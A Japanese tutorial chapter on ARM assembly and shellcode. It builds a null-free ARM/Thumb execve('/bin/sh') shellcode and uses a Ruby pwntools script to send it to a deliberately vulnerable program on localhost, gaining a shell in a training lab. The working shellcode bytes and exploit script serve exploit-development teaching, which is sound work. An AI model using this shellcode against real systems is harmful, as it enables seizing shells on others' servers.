# 1. Crafting Shellcode :shell:

## 1.1 ARM アセンブリ基礎

第1章では、Exploitには欠かせないシェルコード作成について学びます。シェルコードとは、攻撃の断片コードのようなもので、アセンブルしたバイナリ値などをExploit コードでは利用します。まずは、ARM の基本的な構文や仕組みについて **Exploit開発が行える程度** のご説明をします。次に実際のシェルコードを作成し、その動きを解説します。最後に、演習問題を通してどのようにシェルコードを扱うのかを理解します。

### レジスタ

ARM の主要なレジスタには、r0 ~ r15レジスタとcpsrレジスタなどがあります。特にr11 ~ r15ジレスタは特殊な用途に使われるため以下のような別名が付けられています。

- r11 レジスタ：フレームポインタ(fp)
- r12 レジスタ：インストラクションポインタ(ip)
- r13 レジスタ：スタックポインタ(sp)
- r14 レジスタ：リンクレジスタ(lr)

また、cpsrレジスタはx86のeflagsレジスタのようなものでフラグ管理をしています。特に下位5bit目のフラグは重要な値になっており、ARMのARMステートとThumbステートと切り替える役割を持っています。ARMステートとThumbステートについては、後述します。

ARM では、r0 ~ r3レジスタに引数を設定し、r0レジスタに戻り値がセットされます。5個以上の引数はスタック渡しされます。また、システムコールを直接呼ぶ場合は、Linuxにおいてはr7レジスタにシステムコール番号、r0 ~ r6レジスタに引数、r0レジスタに戻り値がセットされます。

### ARM アセンブリでHello World

では、まずはじめに`Hello` を出力するプログラム`hello.asm` を作成してみましょう。様々な命令を紹介するために少し冗長に構築しています。ご存知の通り命令の種類はとても多いので、一部のみ取り扱います。

```wasm
.text
.global _start
_start:
        eor r0, r0     @ r0 = 0
        add r0, #1     @ r0 += 1
        adr r1, s      @ r1 = &s
        mov r2, #6     @ r2 = 6
        mov r7, #4     @ r7 = 4
        svc 0          @ write(1, &s, 6)
        eor r0, r0     @ r0 = 0
        add r7, r0, #1 @ r7 = 1
        svc 0          @ exit(0)
s:
  .asciz "Hello\n"
```

各行の命令について補足していきます。eor 命令は、xorを行う命令です。引数に同じr0 レジスタを取っているため0初期化していることがわかります。add 命令は、加算を行う命令です。2番目のオペランドは、即値を表しています。したがって本命令は、r0にr0+1を代入する命令になっています。adr 命令は、ラベルのアドレスを第1オペランドに代入する用途で使っています。mov 命令は、値を代入する命令です。svc 命令は、システムコールを発行する命令です。オペランドは基本的に無視されます。ここでは、r7 レジスタに4が入っているためwrite システムコールを発行し、`Hello\n` を出力します。その後の3命令はもう読み解けるでしょう。システムコール番号を調べる際には、`ausyscall` コマンドが便利です。以下のようにシステムコール名を与えることで、システムコール番号を表示してくれます。

```bash
$ ausyscall write
write              4
writev             146
pwrite64           181
pciconfig_write    273
pwritev            362
process_vm_writev  377
pwritev2           393
```

また、本コードから実行ファイルを作成する際には、以下のように`as` と`ld` コマンドを用います。実行すると前述した通り文字列を表示して終了します。

```bash
$ as hello.asm -o hello.o
$ ld hello.o -o hello
$ ./hello
Hello
```

### Thumb ステートメント

ARM には、通常のARM ステートとThumb ステートの2つのステートが存在します。以下に主な違いを示します。

|観点|ARM ステート|Thumb ステート|
|:----:|:---:|:---:|
|命令語の長さ|4 byte| 2 byte|
|扱える汎用レジスタの数| 16個|8個|

ARM ステートとThumb ステートの切り替えには、BX 命令とBLX 命令が利用されます。BX r0 のようにレジスタ指定で制御が移る場合は、レジスタの中身が偶数であればARM ステート、奇数であればThumb ステートに切り替わります。よくある例として、`add r3, pc, #1; bx r3` を実行すると、r3 レジスタには、pc+1の奇数のアドレスが格納され、そのアドレスに対してジャンプするため、元がARM ステートの場合はThumb ステートに切り替わります。

::: tip
Exploit 開発においては、Thumb ステートメントは命令語の長さが短いため、長さ制限などがある場合にはとても便利です。
:::

## 1.2 シェルコード作成

シェルコードの最も代表的な処理は、`execve("/bin/sh", NULL, NULL)` を実行することです。これをリモート側のサーバ上で実行することで、リモートサーバのシェルを奪取することができます。ARM では `execve` システムコールの番号は、11となっています。そのため、r7 レジスタには11を設定する必要があります。引数にはr0レジスタに`/bin/sh` のアドレス、r1レジスタとr2レジスタには0を設定する必要があります。この状態で、svc 命令を実行することでシェルを起動することができます。以下にシェルコードの例を示します。

```wasm
.text
.global _start

_start:
        .code 32
        add r3, pc, #1
        bx r3

        .code 16
        adr r0, s
        mov r7, #11
        eor r1, r1
        eor r2, r2
        strb r2, [r0, #7]
        svc #1
s:      .asciz "/bin/sh\x41"
```

また、今回はThumb ステートも用いてバイト数を削る試みもしています。`bx r3` でジャンプする際に`adr r0, s` のアドレス+1した値に飛ぼうとしてます。これにより`adr r0, s` からはThumb ステートで実行されます。文字列`s` では、末尾に`\x41` つまり`A` が余分についています。本来であればNULL終端をさせたいところですが、Buffer Overflowを招くstrcpy関数などでは、NULL終端してしまうため攻撃用のペイロードが意図しないところでコピーが止まる可能性があります。そこで、`strb r2, [r0, #7]` を使って、文字列`s` のアドレス+7をしたアドレスに対して、r2ジレスタの値をストアしています。r2 レジスタは、1つ前の命令で0初期化しているため、本処理は、`\x41` を`\x00` に置き換える処理になっています。生の値として`\x00` を埋め込むのではなく、コードの実行中に`\x00` に置き換えることでNULLが無いシェルコードを実現しています。実際にアセンブルして実行ファイルを作成し、中身を見てみましょう。

```bash
$ as shellcode.asm -o shellcode.o
$ ld shellcode.o -o shellcode.bin
$ objdump -d shellcode.bin

shellcode.bin:     file format elf32-littlearm


Disassembly of section .text:

00010054 <_start>:
   10054:       e28f3001        add     r3, pc, #1
   10058:       e12fff13        bx      r3
   1005c:       a002            add     r0, pc, #8      ; (adr r0, 10068 <s>)
   1005e:       270b            movs    r7, #11
   10060:       4049            eors    r1, r1
   10062:       4052            eors    r2, r2
   10064:       71c2            strb    r2, [r0, #7]
   10066:       df01            svc     1

00010068 <s>:
   10068:       6e69622f        .word   0x6e69622f
   1006c:       4168732f        .word   0x4168732f
   10070:       00              .byte   0x00
   10071:       00              .byte   0x00
   10072:       46c0            nop                     ; (mov r8, r8)
```

## 1.3 サーバのシェルを奪取する演習

では、まずはじめに他の章でも使っていく攻撃環境の構築方法についてご紹介します。ここでは、Raspbian 側でsocat を用いてバイナリファイルを特定のポートで待ち受けて、そこへ通信して攻撃していきます。以下のようにして実行します。ここでは、` shellcode` という実行ファイルが同梱しているので、これを8888/tcp で待受させます。このファイルは、入力を受け取り、それを実行するプログラムになっているため、送ったシェルコードがそのまま実行されてしまうとても危険なプログラムです。

```bash
$ socat tcp-l:8888.reuseaddr,fork exec:./shellcode
```

上記を実行後、ホスト環境から接続すると以下のような応答が帰ってくるはずです。

```bash
$ nc localhost 8888
Give me a shellcode: 
```

これで攻撃環境の構築は終了です。次に、実際のExploit コードを作成していきますが、その前に [1.2 シェルコード作成](#シェルコード作成) で作成したシェルコードをスクリプト言語などで扱えるようにします。シェルコードとして実行する必要があるのは、アセンブリ言語で作成した部分のみなので、以下のようにして取り出します。

```bash
$ objcopy -O binary shellcode.bin shellcode_hex.bin
$ hexdump -v -e '"\\""x" 1/1 "%02x" ""' shellcode_hex.bin
\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x0b\x27\x49\x40\x52\x40\xc2\x71\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x41
```

8888/tcp と接続して、このシェルコードを送るExploit コードを以下に示します。

```ruby
#!/usr/bin/env ruby
#coding: ascii-8bit
require 'pwn'

host = 'localhost'
port = 8888
z = Sock.new host, port
z.recvuntil ": "
payload = "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x0b\x27\x49\x40\x52\x40\xc2\x71\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x41"
puts "[*] shellcode length: #{payload.length}"
z.sendline payload
z.interact
```

本コードを実行すると以下のように、Raspbian 内部のシェルを操作できるようになっていることがわかります。また、このシェルコードの長さは、28byteでした。

```bash
$ ./solve.rb
[*] shellcode length: 28
[INFO] Switching to interactive mode
id
uid=1000(pi) gid=1000(pi) groups=1000(pi),4(adm),20(dialout),24(cdrom),27(sudo),29(audio),44(video),46(plugdev),60(games),100(users),105(input),109(netdev),997(gpio),998(i2c),999(spi)
```

続く章でも同じような手順で、バイナリを待ち受けて、Exploit コードを実行します。

## 1.4 まとめ

本章では、ARMアセンブリの基本からシェルコードの作成と実行まで幅広く見てきました。ARMアセンブリは、x86と違う点が多く少しむずかしいですが、Exploit をする上ではThumbモードなど重要な要素がとても多く絡んできます。適切に理解することで、他の攻撃手法を正しく理解できるようになると思います。